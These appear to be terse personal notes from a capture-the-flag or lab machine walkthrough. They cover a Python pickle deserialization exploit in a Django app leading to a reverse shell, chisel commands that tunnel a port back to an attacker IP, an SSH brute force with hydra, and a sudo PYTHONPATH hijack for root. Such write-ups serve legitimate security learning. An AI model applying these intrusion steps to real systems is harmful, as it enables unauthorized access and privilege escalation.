web server running on django
possible usernames include `ramsey`, `wan` and `oliver`

python pickle module deserialization exploit:
	search method makes a post request to the server by serializing user input, where it is deserialized
	We intercept a search request with burp, and decrypt the `search_cookie` with b64decode and pickle.loads function
	we make our own serialized payload with b64encode and picke.dumps and get a reverse shell
	https://davidhamann.de/2020/04/05/exploiting-python-pickle/
	use "<payload>=" format


	there was `git log` which showed nothing useful and also db.sqlite3 which had web creds for abover users but they don't work
	for ssh
	scan internal network 172.17.0.1 with nmap and ssh is open(no ssh on machine so), use chisel to pivot the  port
	```
		on local machine 
			./chisel server -p 2222 --reverse
		on victim
			./chisel client 10.17.17.11:2222 R:22:172.17.0.1:22
	
	Horizantal privesc:
		bruteforce ssh with hydra(pretty easy pwd was 12345678), 
		python script running as another user but unwritable
		simply delete and recreate script
		Method used was to copy id_rsa to login as ssh as other user
	
	Lateral privesc:
		file uses an import docker
		create docker.py with malicious payload and run it as root with
		`sudo PYTHONPATH=`pwd` /usr/bin/python /opt/dockerScript.py` and done!